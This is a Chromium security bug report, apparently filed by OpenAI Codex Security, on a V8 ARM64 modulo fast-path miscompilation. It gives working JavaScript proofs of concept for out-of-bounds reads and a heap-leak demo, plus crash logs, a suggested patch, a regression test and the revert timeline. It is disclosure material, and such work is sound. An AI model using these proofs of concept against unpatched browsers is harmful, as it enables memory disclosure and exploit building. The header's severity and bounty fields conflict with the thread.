# Incorrect Float64Mod Fast-Path Producing Range Confusion in Optimizing Compilers

| Field | Value |
|-------|-------|
| **Issue ID** | [488078904](https://issues.chromium.org/issues/488078904) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | br...@openai.com |
| **Assignee** | ma...@chromium.org |
| **Created** | 2026-02-27 |
| **Bounty** | Confirmed (amount unknown) |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md

Please see the following link for instructions on filing security bugs: https://www.chromium.org/Home/chromium-security/reporting-security-bugs

Reports may be eligible for reward payments under the Chrome VRP: https://g.co/chrome/vrp

NOTE: Security bugs are normally made public once a fix has been widely deployed.

-------------------------

VULNERABILITY DETAILS
Security Report: Incorrect Float64Mod Fast-Path Producing Range Confusion in Optimizing Compilers
Reporter: OpenAI Codex Security
Organization: OpenAI
Component: V8 JavaScript Engine (ARM64 backend)
Affected Area: Float64 modulo fast-path / Turbofan Typer
Bug Class: Incorrect arithmetic lowering → incorrect range typing → bounds check misoptimization
Discovery Method: Automated compiler validation and differential execution analysis

Summary
OpenAI  Codex Security identified an inconsistency between the ARM64 Float64Mod fast-path implementation and V8’s semantic expectations for % on IEEE-754 double values.
Under specific inputs involving large, exactly-representable integers, the fast-path computes an incorrect quotient due to floating-point rounding during division. This produces an invalid remainder, including negative results for operands that are both positive integers.
Because other parts of the compiler pipeline (including constant folding and OperationTyper) compute the mathematically correct result, this discrepancy introduces observable disagreement between optimized and non-optimized execution paths.
The resulting mismatch causes incorrect range typing to propagate through TurboFan/Maglev optimization stages, allowing downstream optimizations to:
Assume non-negative ranges
Make optimization decisions based on these incorrect ranges
Results in Out-Of-Bounds read in string.endsWith and other potential unsafe lowerings
In hardened runtime configurations this manifests as an Out-Of-Bounds read; in non-hardened configurations this behavior may permit an Out-Of-Bounds write.

Impact
This issue enables attacker-controlled JavaScript to induce compiler state divergence between baseline and optimized execution, resulting in:
incorrect range inference,
invalid optimization reasoning, leading to
Out-of-bounds read/write on un-hardened v8 configs
Out-of-bounds read on default v8 config
The bug therefore represents a JIT miscompilation with security relevance, rather than a correctness-only arithmetic issue.

Root Cause (High Level)
The ARM64 fast-path implements modulo as:
left - trunc(left/right) * right
using floating-point division followed by Frintz and Fmsub
For sufficiently large operands, left/right rounds upward due to double-precision limits, producing an off-by-one quotient and therefore an invalid remainder.
Subsequent compiler stages assume % obeys mathematical modulus properties, creating unsound type information.

The remainder of this document provides a minimal reproducer, compiler analysis, and optimization-pipeline impact.
Analysis of Incorrect Float64Mod Implementation

Recent commit added a fast path for the modulo operation:
https://github.com/v8/v8/commit/17b9f6bac81ff15e76877afcf5b435d14973d049

This fastpath checks for positive integer inputs and uses then computes left - trunc(left/right)*right using floating-point division and Fmsub.


void MacroAssembler::Float64Mod(VRegister out, VRegister left,
                                VRegister right) {
  ...
  // Both are positive integers.
  Fdiv(d_temp, left, right);
  Frintz(d_temp, d_temp);
  Fmsub(out, d_temp, right, left);
  ...
}


However, for large integer operands, left/right can round to the next integer because of limited double precision, so Frintz uses an off‑by‑one quotient. This can yield an incorrect remainder (including negative values) even though both inputs are positive integers.

For example:

left=261387672286309216
right=936873377370284

Both are exactly representable, but left/right rounds to 279, producing a remainder of -20 instead of the correct 936873377370264.

We can verify that this happens when taking this code path in the baseline interpreter: 

const leftBig = 261387672286309216n;
const rightBig = 936873377370284n;

const left = Number(leftBig);
const right = Number(rightBig);
const expected = Number(leftBig % rightBig);
const actual = left % right;

print('left_exact', BigInt(left) === leftBig);
print('right_exact', BigInt(right) === rightBig);
print('expected', expected);
print('actual', actual);
---
left_exact true
right_exact true
expected 936873377370264
actual -20


Leveraging In Turbofan / Maglev

When we compile JIT code targeting this behavior, there are two possible outcomes for the Operator:

1. We lower it via turbofan or maglev via the buggy pathway
https://github.com/v8/v8/blob/23c6caade2b339cc2c145e56f24837b4e592c02b/src/compiler/backend/arm64/code-generator-arm64.cc#L2235

case kArm64Float64Mod: {
  __ Float64Mod(d0, d0, d1);
  break;
}


https://github.com/v8/v8/blob/23c6caade2b339cc2c145e56f24837b4e592c02b/src/maglev/arm64/maglev-ir-arm64.cc#L779



void Float64Modulus::GenerateCode(MaglevAssembler* masm,
                                  const ProcessingState& state) {
  AllowExternalCallThatCantCauseGC scope(masm);
  __ Float64Mod(d0, d0, d1);
}


   2. It is constant folded via machine-operator-reducer.
https://github.com/v8/v8/blob/23c6caade2b339cc2c145e56f24837b4e592c02b/src/compiler/machine-operator-reducer.cc#L705

case IrOpcode::kFloat64Mod: {
  Float64BinopMatcher m(node);
  ...
  if (m.IsFoldable()) {  // K % K => K
    return ReplaceFloat64(
        Modulo(m.left().ScalarValue(), m.right().ScalarValue()));
  }
  break;
}


 Important note here is the constant folding actually uses the correct calculations, meaning the constant it is folded into will differ from the lowered result:

const LEFT = 261387672286309216;
const RIGHT = 936873377370284;

function g() {
  return LEFT % RIGHT;
}


const g_baseline1 = g();
const g_baseline2 = g();

print('g.baseline', g_baseline1);

%PrepareFunctionForOptimization(g);
for (let i = 0; i < 20; ++i) g();
%OptimizeFunctionOnNextCall(g);
const g_optimized = g();


print('g.optimized', g_optimized);
---
g.baseline -20
g.optimized 936873377370264


To take it a step further, we can find other parts of the compiler besides the constant folding which use the correct calculation.

We found the operation-typer also performs the mod correctly:
https://github.com/v8/v8/blob/23c6caade2b339cc2c145e56f24837b4e592c02b/src/compiler/operation-typer.cc#L834

Type OperationTyper::NumberModulus(Type lhs, Type rhs) {
	...
	if (lhs.Is(cache_->kInteger) && rhs.Is(cache_->kInteger)) {
	  double labs = std::max(std::abs(lmin), std::abs(lmax));
	  double rabs = std::max(std::abs(rmin), std::abs(rmax)) - 1;
	  double abs = std::min(labs, rabs);
	  double min = 0.0, max = 0.0;
	  if (lmin >= 0.0) {
	    min = 0.0;
	    max = abs;
	  }
	  ...
	  type = Type::Range(min, max, zone());
	}
	...
}



This means that if we can create a setup where the NumberModulus is not constant folded, we will have a node which has an incorrect range type.


const LEFT = 261387672286309216;
const RIGHT1 = 9681024899492934;
const RIGHT2 = 4931842873326589;
const S = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef';

function sc(flag) {
  const r = flag ? RIGHT1 : RIGHT2;
  const i = (LEFT % r) % 32;
  return S.charCodeAt(i);
}

print('baseline.true', String(sc(true)));
print('baseline.false', String(sc(false)));
%PrepareFunctionForOptimization(sc);
for (let i = 0; i < 10000; ++i) sc((i & 1) === 0);
%OptimizeFunctionOnNextCall(sc);
print('optimized.true', String(sc(true)));
print('optimized.false', String(sc(false)));

When we look at the actual graph, we can see that the NumberModulus node is typed as a positive number. However this type assessment is wrong, as the actual computed value will be negative. We can propagate this incorrect type by using %32 to constrain it to a smaller reasonable range.



----- Graph after V8.TFEscapeAnalysis -----
...
#97:NumberModulus(#85:NumberConstant, #40:Phi)  [Type: Range(0, 9681024899492932)]
#55:NumberConstant[32]()  [Type: Range(32, 32)]
#98:NumberModulus(#97:NumberModulus, #55:NumberConstant)  [Type: Range(0, 31)]

...
#91:CheckBounds[FeedbackSource(#4), 0](#98:NumberModulus, #55:NumberConstant, #51:Checkpoint, #29:Merge)  [Type: Range(0, 31)]
#92:StringCharCodeAt(#86:HeapConstant, #91:CheckBounds, #91:CheckBounds, #29:Merge)  [Type: Range(0, 65535)]
----- Graph after V8.TFSimplifiedLowering -----
#97:Float64Mod(#106:Float64Constant, #40:Phi)  [Type: Range(0, 9681024899492932)]
#108:Float64Constant[32 (0x4040000000000000)]()
#98:Float64Mod(#97:Float64Mod, #108:Float64Constant)  [Type: Range(0, 31)]
...
#91:CheckedUint32Bounds[FeedbackSource(#4), 2](#110:ChangeFloat64ToInt32, #111:Int32Constant, #51:Checkpoint, #29:Merge)  [Type: Range(0, 31)]
#112:ChangeUint32ToUint64(#91:CheckedUint32Bounds)
#92:StringCharCodeAt(#86:HeapConstant, #112:ChangeUint32ToUint64, #91:CheckedUint32Bounds, #29:Merge)  [Type: Range(0, 65535)]


From there we can show that this incorrect range causes the CheckBounds is reduced to kAbortOnOutOfBounds (which results in lowering to Unreachable and a runtime crash during JIT function execution).
Note the 2 flag on the CheckedUint32Bounds meaning the node has been marked with kAbortOnOutOfBounds: 
https://github.com/v8/v8/blob/23c6caade2b339cc2c145e56f24837b4e592c02b/src/compiler/simplified-operator.h#L294

enum class CheckBoundsFlag : uint8_t {
  kConvertStringAndMinusZero = 1 << 0,  // instead of deopting on such inputs
  kAbortOnOutOfBounds = 1 << 1,         // instead of deopting if input is OOB
  kAllow64BitBounds = 1 << 2,           // the bounds may exceed 32 bit range
};


This kAbortOnOutOfBounds is part of hardening against optimizing away bounds checks, but shows that we do in fact propagate an incorrect range type, which is acted on by other JIT optimizations. If the hardening is off, this check would be fully eliminated.
https://github.com/v8/v8/blob/23c6caade2b339cc2c145e56f24837b4e592c02b/src/compiler/simplified-lowering.cc#L2040

	// The bounds check is redundant if we already know that
	// the index is within the bounds of [0.0, length[.
	// TODO(neis): Move this into TypedOptimization?
	if (v8_flags.turbo_typer_hardening) {
	  new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;
	} else {
	  DeferReplacement(node, NodeProperties::GetValueInput(node, 0));
	  return;
	}


We can see that we hit the hardening check when running this POC:


baseline.true NaN
baseline.false NaN
Received signal 11 SEGV_ACCERR febb0102d6be

==== C stack trace ===============================

./out/arm64.debug/d8(_ZN2v84base5debug10StackTraceC1Ev+0x28)[0xaaaaeb4d837c]
./out/arm64.debug/d8(+0xec282cc)[0xaaaaeb4d82cc]
linux-vdso.so.1(__kernel_rt_sigreturn+0x0)[0xffff9ec557d0]
[0xaaaaf0006800]
[end of stack trace]
Segmentation fault

string.endsWith Range Elimination Hardening Bypass

We are actively looking for sinks which may have stronger security outcomes for this incorrect range.

One such example is string.endsWith, which leads to an OOB read:



const LEFT = 261387672286309216;
const RIGHT1 = 9681024899492934;
const RIGHT2 = 4931842873326589;
const S = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef';

function ew(flag) {
  const r = flag ? RIGHT1 : RIGHT2;
  const i = (LEFT % r) % 32;
  return [i, S.endsWith('A', i + 1), S.endsWith('D', i + 4), S.endsWith('bcd', i + 30)];
}

print('phase', 'baseline.begin');
print('baseline.true', JSON.stringify(ew(true)));
print('baseline.false', JSON.stringify(ew(false)));
print('phase', 'prepare');
%PrepareFunctionForOptimization(ew);
print('phase', 'warmup.begin');
for (let i = 0; i < 10000; ++i) {
  ew((i & 1) === 0);
}
print('phase', 'warmup.end');
print('phase', 'optimize-request');
%OptimizeFunctionOnNextCall(ew);
print('phase', 'optimized.true.begin');
print('optimized.true', JSON.stringify(ew(true)));
print('phase', 'optimized.false.begin');
print('optimized.false', JSON.stringify(ew(false)));


Unlike the charAt case, the interesting optimization here is not with the hardened CheckBounds -> CheckedUint32Bounds[..., 2] transition. For endsWith, the wrong % range flows into i + 1, then into the reducer’s start = min(max(endPosition, 0), length) - 1 computation. In V8.TFTyper, TurboFan still has an explicit NumberLessThan(start, 0) branch guarding the false fast path. By V8.TFEscapeAnalysis, that guard is gone entirely because the same path has been narrowed to Range(0, 31), and the resulting value is sent straight into TypeGuard[Unsigned30] -> StringCharCodeAt.


----- Graph after V8.TFTyper -----
#54:SpeculativeNumberModulus[Number](#103:NumberConstant[2.61388e+17], #40:Phi[kRepTagged])  [Type: Range(0, 9681024899492932)]
#55:NumberConstant[32]  [Type: Range(32, 32)]
#56:SpeculativeNumberModulus[Number](#54:SpeculativeNumberModulus[Number], #55:NumberConstant[32])  [Type: Range(0, 31)]   <---------- Incorrect range type
#67:NumberConstant[1]  [Type: Range(1, 1)]
#87:SpeculativeAdditiveSafeIntegerAdd[AdditiveSafeInteger](#56:SpeculativeNumberModulus[Number], #67:NumberConstant[1])  [Type: Range(1, 32)]
#121:CheckSmi[FeedbackSource(#8)](#87:SpeculativeAdditiveSafeIntegerAdd[AdditiveSafeInteger])  [Type: Range(1, 32)]
#122:NumberMax(#121:CheckSmi[FeedbackSource(#8)], #60:NumberConstant[0])  [Type: Range(1, 32)]
#123:NumberMin(#122:NumberMax, #114:StringLength)  [Type: Range(0, 32)]
#126:Phi[kRepTagged](#114:StringLength, #123:NumberMin, #124:Merge)  [Type: Range(0, 536870888)]
#127:NumberSubtract(#126:Phi[kRepTagged], #67:NumberConstant[1])  [Type: Range(-1, 536870887)]
#128:NumberLessThan(#127:NumberSubtract, #60:NumberConstant[0])  [Type: Boolean]                   <--------------- This comparison is eliminated
#130:Branch[JS, False](#128:NumberLessThan, #124:Merge)
#131:IfTrue(#130:Branch[JS, False])
#132:IfFalse(#130:Branch[JS, False])
#133:NumberAdd(#60:NumberConstant[0], #127:NumberSubtract)  [Type: Range(-1, 536870887)]
#134:TypeGuard[Unsigned30](#133:NumberAdd, #132:IfFalse)  [Type: Range(0, 536870887)]
#135:StringCharCodeAt(#113:CheckString[FeedbackSource(#8)], #134:TypeGuard[Unsigned30], #132:IfFalse)  [Type: Range(0, 65535)]

----- Graph after V8.TFEscapeAnalysis -----
#153:NumberModulus(#103:NumberConstant[2.61388e+17], #40:Phi[kRepTagged])  [Type: Range(0, 9681024899492932)]
#154:NumberModulus(#153:NumberModulus, #55:NumberConstant[32])  [Type: Range(0, 31)]
#87:SpeculativeAdditiveSafeIntegerAdd[AdditiveSafeInteger](#154:NumberModulus, #67:NumberConstant[1])  [Type: Range(1, 32)]
#121:CheckSmi[FeedbackSource(#8)](#87:SpeculativeAdditiveSafeIntegerAdd[AdditiveSafeInteger])  [Type: Range(1, 32)]
#122:NumberMax(#121:CheckSmi[FeedbackSource(#8)], #60:NumberConstant[0])  [Type: Range(1, 32)]
#123:NumberMin(#122:NumberMax, #55:NumberConstant[32])  [Type: Range(1, 32)]
#127:NumberSubtract(#123:NumberMin, #67:NumberConstant[1])  [Type: Range(0, 31)]
// <-------------------- No conditional branch
#133:NumberAdd(#60:NumberConstant[0], #127:NumberSubtract)  [Type: Range(0, 31)]
#134:TypeGuard[Unsigned30](#133:NumberAdd, #29:Merge)  [Type: Range(0, 31)]
#135:StringCharCodeAt(#110:HeapConstant[0xfebe0102d731 <String[32]: #ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef>], #134:TypeGuard[Unsigned30], #29:Merge)  [Type: Range(0, 65535)]


From there we can show that this incorrect range does not become an unreachable() check on the user-controlled index like the charAt case. Instead, in ReduceStringPrototypeEndsWith at js-call-reducer.cc https://github.com/v8/v8/blob/23c6caade2b339cc2c145e56f24837b4e592c02b/src/compiler/js-call-reducer.cc#L1124, it causes the `start < 0` guard to become dead and then sends the negative runtime `%` value down an unsigned StringCharCodeAt path. That is the interesting difference: the bad range is being used to eliminate the start < 0 control path, and the resulting unsigned string-index path is what later faults in the saved debug gdb log with ldrb w5, [x7, x5]:


gdb --args ./out/arm64.release/d8 /tmp/poc.js --allow-natives-syntax
phase baseline.begin
baseline.true [-2,false,false,false]
baseline.false [-1,false,false,false]
phase prepare
phase warmup.begin
phase warmup.end
phase optimize-request
phase optimized.true.begin
optimized.true [-2,false,false,false]
phase optimized.false.begin

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x0000aaaaf00015f4 in ?? ()
(gdb) x/10i $pc
=> 0xaaaaf00015f4:	ldrb	w5, [x7, x5]
   0xaaaaf00015f8:	cmp	w5, #0x41
   0xaaaaf00015fc:	b.eq	0xaaaaf000160c  // b.none
   0xaaaaf0001600:	add	w5, w4, #0x4
   0xaaaaf0001604:	mov	x8, #0x55                  	// #85
   0xaaaaf0001608:	b	0xaaaaf0001614
   0xaaaaf000160c:	add	w5, w4, #0x4
   0xaaaaf0001610:	mov	x8, #0x71                  	// #113
   0xaaaaf0001614:	stur	w8, [x3, #11]
   0xaaaaf0001618:	cmp	w5, #0x20
(gdb) i r
...
x5             0x10000000a         4294967306
...
x7             0xfebe0101e025      280092014141477

We can see that in this case we actually hit an OOB load.

string.substr Range Elimination Hardening Bypass
We identified one other practical sink for this class of incorrect range typing vulnerability.

string.substr has a similar pattern where the incorrect range type is used to eliminate a conditional branch. 


----- Graph after V8.TFTyper / escape-analysis for the saved substr trace -----
#56:SpeculativeNumberModulus[Number](#54:SpeculativeNumberModulus, #55:NumberConstant[32])  [Type: Range(0, 31)]   <---------- Incorrect range type
#76:SpeculativeNumberMultiply[Number](#56:SpeculativeNumberModulus, #75:NumberConstant[4])  [Type: Range(0, 124)]
#238:CheckSmi[#5](#76:SpeculativeNumberMultiply)  [Type: Range(0, 124)]
#248:NumberLessThan(#238:CheckSmi, #83:NumberConstant[0])  [Type: HeapConstant(false)]      <---------- This comparison is eliminated
#251:Select(..., #250:NumberMax, #238:CheckSmi)  [Type: Range(0, 536871012)]
#252:TypeGuard[Unsigned30](#251)  [Type: Range(0, 536871012)]
#257:TypeGuard[Unsigned30](...)   [Type: Range(...)]
#261:StringSubstring(#237:CheckString, #252:TypeGuard, #257:TypeGuard, ...)


For substr, the bad % range is used to prove start < 0 is always false, so the negative-start normalization path is removed, but unlike endsWith the surviving value is not converted to an unsigned character index. The TypeGuard[Unsigned30] here is just an optimizer assertion based on the stale range, not a runtime cast; later StringSubstring is lowered with signed Word32/IntPtr inputs, so a runtime start of -28 or -14 stays negative when it reaches the substring builtin. That is why substr can read from before the string data, whereas endsWith first rebuilt the bad value into an unsigned StringCharCodeAt index.

This allows the substr to successfully read data Out-Of-Bounds from the V8 Heap Sandbox.

In this final POC we leak the contents of BigInts to prove cross-object memory leaking is possible.



// Flags: --allow-natives-syntax
const LEFT = 261387672286309216;
const RIGHT1 = 9681024899492934;
const RIGHT2 = 4931842873326589;

const P1 = BigInt('0x41424344454647483132333435363738');
const T1 = JSON.parse('"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef"');
const P2 = BigInt('0x51525354555657586162636465666768');
const T2 = JSON.parse('"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef"');

function leak1(flag) {
  const r = flag ? RIGHT1 : RIGHT2;
  const i = (LEFT % r) % 32;
  const out = T1.substr(i * 14, 16);
  return [i, i * 14, out.length,
    out.charCodeAt(0), out.charCodeAt(1), out.charCodeAt(2), out.charCodeAt(3),
    out.charCodeAt(4), out.charCodeAt(5), out.charCodeAt(6), out.charCodeAt(7),
    out.charCodeAt(8), out.charCodeAt(9), out.charCodeAt(10), out.charCodeAt(11),
    out.charCodeAt(12), out.charCodeAt(13), out.charCodeAt(14), out.charCodeAt(15)];
}

function leak2(flag) {
  const r = flag ? RIGHT1 : RIGHT2;
  const i = (LEFT % r) % 32;
  const out = T2.substr(i * 14, 16);
  return [i, i * 14, out.length,
    out.charCodeAt(0), out.charCodeAt(1), out.charCodeAt(2), out.charCodeAt(3),
    out.charCodeAt(4), out.charCodeAt(5), out.charCodeAt(6), out.charCodeAt(7),
    out.charCodeAt(8), out.charCodeAt(9), out.charCodeAt(10), out.charCodeAt(11),
    out.charCodeAt(12), out.charCodeAt(13), out.charCodeAt(14), out.charCodeAt(15)];
}

print('baseline.1.true', JSON.stringify(leak1(true)));
print('baseline.2.true', JSON.stringify(leak2(true)));
%PrepareFunctionForOptimization(leak1);
%PrepareFunctionForOptimization(leak2);
for (let i = 0; i < 20000; ++i) {
  leak1((i & 1) === 0);
  leak2((i & 1) === 0);
}
%OptimizeFunctionOnNextCall(leak1);
%OptimizeFunctionOnNextCall(leak2);
print('optimized.1.true', JSON.stringify(leak1(true)));
print('optimized.2.true', JSON.stringify(leak2(true)));
print('optimized.1.false', JSON.stringify(leak1(false)));
print('optimized.2.false', JSON.stringify(leak2(false)));
---
baseline.1.true [-2,-28,16,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84]
baseline.2.true [-2,-28,16,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84]
optimized.1.true [-2,-28,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
optimized.2.true [-2,-28,16,104,103,102,101,100,99,98,97,88,87,86,85,84,83,82,81]
optimized.1.false [-1,-14,16,0,0,5,1,0,0,3,0,0,0,32,0,0,0,65,66]
optimized.2.false [-1,-14,16,82,81,5,1,0,0,3,0,0,0,32,0,0,0,65,66]


Suggested Fix

The current fast path first proves both operands are positive integer-valued doubles, then computes:


Fdiv(d_temp, left, right);
Frintz(d_temp, d_temp);
Fmsub(out, d_temp, right, left);


That quotient can round to the wrong integer for large operands, which makes the remainder negative or otherwise inconsistent with the % contract.

The smallest safe fix is:

keep the existing positive-integer fast-path gate
keep the existing floating fast computation
validate the postcondition that the remainder must lie in [0, right)
otherwise fall back to the already-existing precise slow path mod_two_doubles_operation()

For positive integers, the exact mathematical remainder must satisfy:


0 <= remainder < right

If the rounded quotient differs from the true truncated quotient by any non-zero integer `k`, then:


computed = exact_remainder - k * right



This necessarily escapes [0, right).

So the postcondition check is enough to detect this class of wrong-quotient bug without changing the structure of the helper or widening the fast path.



--- a/src/codegen/arm64/macro-assembler-arm64.cc
+++ b/src/codegen/arm64/macro-assembler-arm64.cc
@@ -3020,6 +3020,7 @@
   {
     UseScratchRegisterScope temps(this);
     VRegister d_temp = temps.AcquireD();
+    VRegister d_candidate = temps.AcquireD();
     Register x_scratch = temps.AcquireX();
 
     // Check if left is a positive integer.
@@ -3038,10 +3039,22 @@
     Fcmp(right, 0.0);
     B(le, &slow);
 
-    // Both are positive integers.
+    // Both are positive integers. The fast path is only valid if the computed
+    // remainder stays within the mathematical range [0, right).
     Fdiv(d_temp, left, right);
     Frintz(d_temp, d_temp);
-    Fmsub(out, d_temp, right, left);
+    Fmsub(d_candidate, d_temp, right, left);
+
+    // If quotient rounding changed the integer truncation result, the computed
+    // remainder escapes [0, right) and we must fall back to the precise slow
+    // path. Important: do not clobber d0/d1 before that fallback, because the
+    // C helper expects the original operands there.
+    Fcmp(d_candidate, 0.0);
+    B(lt, &slow);
+    Fcmp(d_candidate, right);
+    B(ge, &slow);
+
+    Fmov(out, d_candidate);
     B(&done_mod);
   }
 
--- a/test/mjsunit/regress/regress-float64mod-arm64-fast-path.js
+++ b/test/mjsunit/regress/regress-float64mod-arm64-fast-path.js
@@ -0,0 +1,46 @@
+// Copyright 2026 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+// Flags: --allow-natives-syntax
+
+(function DirectWrongResultRegression() {
+  const leftBig = 261387672286309216n;
+  const rightBig = 936873377370284n;
+  const left = Number(leftBig);
+  const right = Number(rightBig);
+  const expected = Number(leftBig % rightBig);
+
+  function mod() {
+    return left % right;
+  }
+
+  assertEquals(expected, mod());
+
+  %PrepareFunctionForOptimization(mod);
+  for (let i = 0; i < 10000; ++i) mod();
+  %OptimizeFunctionOnNextCall(mod);
+
+  assertEquals(expected, mod());
+})();
+
+(function LiveMod32Regression() {
+  const LEFT = 261387672286309216;
+  const RIGHT1 = 9681024899492934;
+  const RIGHT2 = 4931842873326589;
+
+  function mod32(flag) {
+    const r = flag ? RIGHT1 : RIGHT2;
+    return (LEFT % r) % 32;
+  }
+
+  assertEquals(4, mod32(true));
+  assertEquals(28, mod32(false));
+
+  %PrepareFunctionForOptimization(mod32);
+  for (let i = 0; i < 10000; ++i) mod32((i & 1) === 0);
+  %OptimizeFunctionOnNextCall(mod32);
+
+  assertEquals(4, mod32(true));
+  assertEquals(28, mod32(false));
+})();



This information is being shared by OpenAI solely for the purpose of improving security and reducing potential harm. This information is presented as-is.  We make no representations or warranties, express or implied, as to the completeness, accuracy, or fitness for any particular purpose of the information. [This includes, without limitation any suggestions or ideas presented on how to remedy or mitigate an identified vulnerability, including whether such suggestions or ideas would be effective and/or could have other negative impacts.]
OpenAI disclaims any liability for direct or indirect damages arising from the reliance on, or use, misuse, or interpretation of this information. Any references to third-party systems, services, or entities are included solely for identification purposes and do not imply endorsement, responsibility, or attribution.


CREDIT INFORMATION
Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: OpenAI Codex Security

## Timeline

### is...@chromium.org (2026-02-27)

Thank you for the report.

Assigning to the CL author.

### dm...@chromium.org (2026-02-27)

Quick note: Maglev doesn't even attempt to compute ranges for Float64Mod so this should be just a correctness bug for maglev. Regarding Turbofan, OOB reads from strings are typically not directly exploitable (and considered medium severity still because they can be used to extract object addresses, which can be used in combination with other bugs to build exploits). However, I can easily imagine that there are way to exploit this in Turbofan through OOB array accesses somehow somewhere, hence setting severity=S1.

### ch...@google.com (2026-02-27)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must exceed severity.

### ch...@google.com (2026-02-28)

Setting milestone because of s0/s1 severity.

### ma...@chromium.org (2026-03-02)

The broken CL <https://chromiumdash.appspot.com/commit/17b9f6bac81ff15e76877afcf5b435d14973d049> is only in M147.

Trying to adjust labels to reflect that.

### ma...@chromium.org (2026-03-02)

I don't have rights to remove the "Security\_Impact-Extended" label. This has only been released to Canary & Dev.

### dx...@google.com (2026-03-02)

Project: v8/v8  

Branch:  main  

Author:  Marja Hölttä [marja@chromium.org](mailto:marja@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7613311>

Revert "[arm64|turbofan|maglev] Implement fast path for modulo"

---


Expand for full commit details
```
     
    This reverts commit 17b9f6bac81ff15e76877afcf5b435d14973d049. 
     
    Reason for revert: b/488078904 
     
    Fixed: 488078904 
     
    Original change's description: 
    > [arm64|turbofan|maglev] Implement fast path for modulo 
    > 
    > Note the existing test case div-mod.js. 
    > 
    > Change-Id: I663f2868a94cb750abecf342e77d69011518fccb 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7594997 
    > Reviewed-by: Victor Gomes <victorgomes@chromium.org> 
    > Commit-Queue: Marja Hölttä <marja@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#105410} 
     
    Change-Id: I2e3f639942eff26f930d9627526788ab0a9ae3f9 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7613311 
    Auto-Submit: Marja Hölttä <marja@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#105515}

```

---

Files:

- M `src/codegen/arm64/macro-assembler-arm64.cc`
- M `src/codegen/arm64/macro-assembler-arm64.h`
- M `src/compiler/backend/arm64/code-generator-arm64.cc`
- M `src/maglev/arm64/maglev-ir-arm64.cc`

---

Hash: [806ba6c228640d8d5542e1065bd51f23625ee36d](https://chromiumdash.appspot.com/commit/806ba6c228640d8d5542e1065bd51f23625ee36d)  

Date: Mon Mar 2 06:42:18 2026


---

### ch...@google.com (2026-03-03)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-03-11)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M147. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [147].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### dr...@chromium.org (2026-03-11)

Fix is already in M147, so removing merge labels.

### sp...@google.com (2026-03-31)

*NOTE: This is an automatically generated email*

Hello,

Chrome Vulnerability Rewards Program (VRP) Panel has decided that the security impact of this
issue does not meet the criteria to qualify for a reward.

Rationale for this decision:

Head hunting

Note that the fact that this issue is not being rewarded does not mean
that the product team won't fix the issue. We have filed a bug with the product
team and they will review your report and decide if a fix is required. We'll
let you know if the issue was fixed.

Regards,   

Google Security Bot

*How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

### ch...@google.com (2026-06-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Head hunting
> 
> 
> Note that the fact that this issue is not being rewarded does not mean
> that the product team won't fix the issue. We have filed a bug with the product
> team and they will review your report and decide if a fix is required. We'll
> let you know if the issue was fixed.
> 
> Regards, \
> Google Security Bot
> 
> *How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/488078904)*
